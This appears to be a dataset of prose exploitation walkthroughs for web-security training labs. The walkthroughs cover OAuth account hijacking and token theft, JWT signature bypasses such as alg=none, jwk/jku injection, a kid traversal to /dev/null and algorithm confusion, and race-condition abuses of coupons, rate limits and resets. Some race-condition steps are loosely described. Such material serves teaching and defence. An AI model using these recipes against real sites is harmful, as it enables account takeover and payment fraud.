text: Attack pattern: attach the attacker's social profile to the admin account. The attacker starts the linking flow, authenticates to the provider with their own credentials, and intercepts the final GET that would complete the link. Instead of sending it, the attacker hosts it on the exploit server and waits for the admin to visit. The admin's browser sends the session cookie, the link completes, and the attacker can now sign in through the social provider as the admin. The state transition is LINK_FLOW_STARTED -> PROVIDER_AUTHORIZED -> FINAL_REQUEST_INTERCEPTED -> VICTIM_SESSION_COMPLETES_LINK -> ATTACKER_SOCIAL_LOGIN.

metadata.title: Forced OAuth Profile Linking: Exploitation Walkthrough
metadata.vulnerability_class: CWE-352: Cross-Site Request Forgery
attack_variants: Paused linking request delivered to victim
Link initiated from an attacker page
prerequisites: Linking endpoint accepts a code without state validation
Attacker can host a page the victim visits

text: Attack pattern: redirect the authorization code to a leaky page. The attacker builds an authorization request whose redirect_uri is the registered callback followed by traversal into a page that forwards or reflects the query string, and delivers it to the admin through the exploit server. The provider, seeing the registered prefix, sends the code to the crafted URL. The page logs the code, which the attacker then submits to the real callback and receives an admin session. The state transition is AUTHORIZATION_REQUEST_CRAFTED -> PROVIDER_ACCEPTS_PREFIX -> CODE_DELIVERED_TO_LEAKY_PAGE -> CODE_EXCHANGED -> ADMIN_SESSION.

metadata.title: OAuth Account Hijacking via redirect_uri: Exploitation Walkthrough
metadata.vulnerability_class: CWE-601: URL Redirection to Untrusted Site
attack_variants: Open redirect chained after the callback
Admin session pre-authorized at the provider
prerequisites: Provider session active for the victim
A same-origin endpoint that leaks the query or redirects externally

text: Attack pattern: chain the callback to an open redirect. The attacker finds a client endpoint that takes a destination parameter and issues a redirect, then builds an authorization URL whose redirect_uri reaches that endpoint through the registered callback prefix. The provider returns the token in the fragment, the browser follows the redirect, and the fragment is sent to the attacker's listener. The attacker uses the token against the API to retrieve the admin's key. The state transition is REDIRECT_ENDPOINT_FOUND -> CALLBACK_CHAINED -> TOKEN_IN_FRAGMENT_FORWARDED -> TOKEN_CAPTURED -> API_ACCESS.

metadata.title: OAuth Access Token Theft via Open Redirect: Exploitation Walkthrough
metadata.vulnerability_class: CWE-601: URL Redirection to Untrusted Site
attack_variants: Open redirect in a post-login path parameter
Admin API key retrieval with the stolen token
prerequisites: Victim has an active provider session
associated_labs: OAuth Access Token Theft via Open Redirect

text: Attack pattern: frame the proxy page and listen. The attacker hosts a page that embeds the vulnerable client page in an iframe and registers a message listener. The framed page posts window.location.href, including the token fragment, to the parent with a wildcard target origin. The attacker's listener receives the URL, extracts the token, and calls the API for the admin's key. The state transition is PAGE_FRAMED -> SELF_URL_POSTED -> ATTACKER_RECEIVES_MESSAGE -> TOKEN_EXTRACTED -> API_ACCESS.

metadata.title: OAuth Access Token Theft via a Proxy Page: Exploitation Walkthrough
metadata.vulnerability_class: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
attack_variants: Missing origin check on the listener
Token in the frame URL fragment
prerequisites: Client page uses postMessage with a wildcard target
Page can be embedded in an iframe
Token appears in the page URL
associated_labs: OAuth Access Token Theft via a Proxy Page

text: Attack pattern: promote the sub claim. The attacker logs in as a normal user, captures the session JWT, and decodes the payload to find sub=wiener. They change it to sub=administrator while leaving the signature untouched, then request the admin panel with the modified token. The server decodes the payload, reads the new subject, and grants administrator access without ever checking the signature. The state transition is SESSION_TOKEN_CAPTURED -> CLAIM_EDITED -> SIGNATURE_IGNORED -> PRIVILEGED_SESSION.

metadata.title: JWT Unverified Signature Bypass: Exploitation Walkthrough
metadata.vulnerability_class: CWE-347: Improper Verification of Cryptographic Signature
prerequisites: JWT used as the session credential
Privileged claims carried in the token

text: Attack pattern: declare the token unsigned. The attacker decodes their session token, changes alg to none, edits sub to administrator, and removes the signature while keeping the trailing dot structure. The server reads alg=none, concludes that verification is unnecessary, and accepts the claims. Case and whitespace variants defeat naive string checks. The state transition is TOKEN_CAPTURED -> ALG_SET_TO_NONE -> SIGNATURE_REMOVED -> CLAIMS_TRUSTED -> ADMIN_ACCESS.

metadata.title: JWT alg=none Acceptance: Exploitation Walkthrough
metadata.vulnerability_class: CWE-347: Improper Verification of Cryptographic Signature
attack_variants: Case variants such as None or NONE
prerequisites: Server reads alg from the token
none accepted by the library or custom verifier

text: Attack pattern: crack the HMAC secret and re-sign. The attacker captures a session token and runs hashcat in JWT mode against a common-secrets wordlist. The secret is recovered, so the attacker edits sub to administrator and signs a new token with the recovered key. The server verifies the signature successfully and grants admin access. The state transition is TOKEN_CAPTURED -> OFFLINE_DICTIONARY_ATTACK -> SECRET_RECOVERED -> FORGED_TOKEN_SIGNED -> ADMIN_ACCESS.

metadata.title: JWT Weak Signing Key: Exploitation Walkthrough
metadata.vulnerability_class: CWE-326: Inadequate Encryption Strength

text: Attack pattern: embed the attacker's public key. The attacker generates an RSA key pair, edits the token payload to sub=administrator, inserts the public key as a jwk header, and signs with the matching private key. The verifier extracts the embedded key and validates the signature, which is guaranteed to pass. The attacker then reaches the admin panel. The state transition is KEYPAIR_GENERATED -> JWK_EMBEDDED -> CLAIMS_EDITED -> TOKEN_SELF_SIGNED -> VERIFIER_ACCEPTS -> ADMIN_ACCESS.

metadata.title: JWT jwk Header Injection: Exploitation Walkthrough
metadata.vulnerability_class: CWE-347: Improper Verification of Cryptographic Signature

text: Attack pattern: publish a malicious key set. The attacker generates a key pair, hosts the public key in a JWKS document on their own server, and builds a token with jku pointing there and sub set to administrator. The token is signed with the attacker's private key. The verifier fetches the attacker's JWKS, selects the key by kid, and validates the signature, granting admin access. The state transition is MALICIOUS_JWKS_HOSTED -> JKU_SET_TO_ATTACKER -> TOKEN_SIGNED -> VERIFIER_FETCHES_KEY -> ADMIN_ACCESS.

metadata.title: JWT jku Header Injection: Exploitation Walkthrough
metadata.vulnerability_class: CWE-347: Improper Verification of Cryptographic Signature
attack_variants: jku pointing to an open redirect

text: Attack pattern: point kid at an empty file. The attacker sets kid to ../../../../../../dev/null and signs the escalated token with an empty HMAC key. The verifier builds the key path from kid, reads the empty file, and uses the empty byte string as the secret. The signature matches, so the token is accepted. A variant points at a known configuration file whose contents are predictable. The state transition is KID_SET_TO_TRAVERSAL -> FILE_RESOLVED_OUTSIDE_KEYSTORE -> KEY_DERIVED_FROM_FILE -> FORGED_TOKEN_VERIFIED.

metadata.title: JWT kid Path Traversal: Exploitation Walkthrough
metadata.vulnerability_class: CWE-22: Improper Limitation of a Pathname to a Restricted Directory
attack_variants: kid pointing to a known public file
prerequisites: kid used in a filesystem path
Verifier uses file contents as key

text: Attack pattern: sign HS256 with the public key. The attacker retrieves the server's RSA public key from the standard JWKS or PEM endpoint, changes the token header to HS256, and signs the escalated payload using the PEM bytes as the HMAC secret. The server reads alg=HS256, loads the same public key as a symmetric secret, and verifies successfully. The attacker reaches the admin panel. The state transition is PUBLIC_KEY_RETRIEVED -> ALG_CHANGED_TO_HS256 -> TOKEN_SIGNED_WITH_PUBLIC_KEY -> VERIFIER_ACCEPTS -> ADMIN_ACCESS.

metadata.title: JWT Algorithm Confusion: Exploitation Walkthrough
metadata.vulnerability_class: CWE-347: Improper Verification of Cryptographic Signature
prerequisites: Server accepts both RSA and HMAC
Same key material used for both

text: Attack pattern: reconstruct the public key, then confuse the algorithm. The attacker collects two tokens signed by the server, recovers the shared RSA modulus from the signatures and messages, and rebuilds the PEM public key. They switch the header to HS256 and sign an escalated payload using that PEM as the HMAC secret. The verifier accepts it as a valid HMAC token. The state transition is TWO_TOKENS_COLLECTED -> MODULUS_RECOVERED -> PUBLIC_KEY_REBUILT -> HS256_TOKEN_FORGED -> ADMIN_ACCESS.

metadata.title: JWT Algorithm Confusion Without an Exposed Key: Exploitation Walkthrough
metadata.vulnerability_class: CWE-347: Improper Verification of Cryptographic Signature
prerequisites: At least two JWTs signed with the same RSA key
associated_labs: JWT Algorithm Confusion Without an Exposed Key

text: Attack pattern: redeem the same coupon many times at once. The attacker adds the target jacket to the cart, applies the discount once to observe the flow, then sends a large burst of identical apply-coupon requests over a single connection so they land together. Every request observes the coupon as unused before any increment commits, and the cart accumulates the discount repeatedly. The attacker checks out at a fraction of the price. The state transition is COUPON_APPLIED_ONCE -> BURST_SENT -> COUNTER_RACE_WON -> MULTIPLE_DISCOUNTS_STACKED -> UNDERPRICED_PURCHASE.

metadata.title: Limit Overrun Race Condition: Exploitation Walkthrough
metadata.vulnerability_class: CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization
prerequisites: Single-use coupon enforced by a check-then-act counter

text: Attack pattern: guess a password list in one synchronized burst. The attacker fixes the username carlos and sends every candidate password in parallel so the requests arrive before any failure counter commits. The endpoint checks each request against the same low count and processes them all. One candidate succeeds, and the attacker uses the resulting session to open the admin panel and delete the target user. The state transition is USERNAME_FIXED -> BURST_SENT -> COUNTER_RACE_WON -> CORRECT_PASSWORD_FOUND -> ADMIN_SESSION.

metadata.title: Rate Limit Bypass via Race Condition: Exploitation Walkthrough
metadata.vulnerability_class: CWE-307: Improper Restriction of Excessive Authentication Attempts
attack_variants: Counter reset with a new cookie
prerequisites: Rate limit based on a mutable failure counter
Weak password in the candidate list
associated_labs: Rate Limit Bypass via Race Condition

text: Attack pattern: race the cart against checkout. The attacker adds the target jacket, then prepares a request that applies a gift card and a checkout request. Sending them together causes the checkout to read the cart after the gift-card credit but before the jacket price is restored, so the order total reflects the cheaper state while the jacket remains in the order. The attacker completes payment at the reduced price. The state transition is JACKET_ADDED -> CREDIT_AND_CHECKOUT_RACED -> TOTAL_COMPUTED_FROM_STALE_STATE -> ORDER_COMMITTED -> UNDERPAID.

metadata.title: Multi-Endpoint Race Condition: Exploitation Walkthrough
metadata.vulnerability_class: CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization
attack_variants: Add jacket raced with gift-card credit
prerequisites: Checkout trusts a previously computed total

text: Attack pattern: race two email addresses through one endpoint. The attacker submits a change to their own controlled address and, in the same instant, a change to the privileged address that has a pending admin invitation. The two requests interleave so the confirmation token delivered to the attacker is accepted for the privileged address, or the privileged address is stored before ownership is verified. The attacker confirms, claims the admin identity, and deletes the target user. The state transition is TWO_ADDRESSES_SUBMITTED -> STEPS_INTERLEAVED -> TOKEN_BOUND_WRONGLY -> PRIVILEGED_ADDRESS_CLAIMED -> ADMIN_ACCESS.

metadata.title: Single-Endpoint Race Condition: Exploitation Walkthrough
metadata.vulnerability_class: CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization
attack_variants: Two addresses raced in one flow
Token bound to the wrong address
Confirmation sent to attacker while privileged address stored
prerequisites: Token not bound to the address
Privileged address carries a pending invitation

text: Attack pattern: recover the timestamp from your own reset. The attacker submits a reset for the victim and, simultaneously, one for their own account. The attacker's email yields a token; knowing their username, they brute-force the small timestamp window around the request to identify the exact value. They then compute the victim's token with the same timestamp and username, open the reset link, set a new password, and log in as the victim. The state transition is PARALLEL_RESETS_TRIGGERED -> OWN_TOKEN_OBSERVED -> TIMESTAMP_RECOVERED -> VICTIM_TOKEN_COMPUTED -> ACCOUNT_TAKEOVER.

metadata.title: Time-Sensitive Password Reset Token: Exploitation Walkthrough
metadata.vulnerability_class: CWE-330: Use of Insufficiently Random Values
prerequisites: Reset token derived from time and username
Attacker can observe their own token

text: Attack pattern: register twice at once. The attacker sends several registration requests for the same username with a permitted domain address and with a privileged address, timed to land inside the construction window. One request inserts the record, another attaches the privileged address before the verification flag is enforced, and the confirmation step accepts the attacker-controlled value. The attacker logs in with the privileged address and gains the associated admin rights. The state transition is PARALLEL_REGISTRATIONS -> OBJECT_PARTIALLY_BUILT -> ADDRESS_OVERWRITTEN -> VERIFICATION_BYPASSED -> ADMIN_ACCOUNT.

metadata.title: Partial Construction Race Condition: Exploitation Walkthrough
metadata.vulnerability_class: CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization
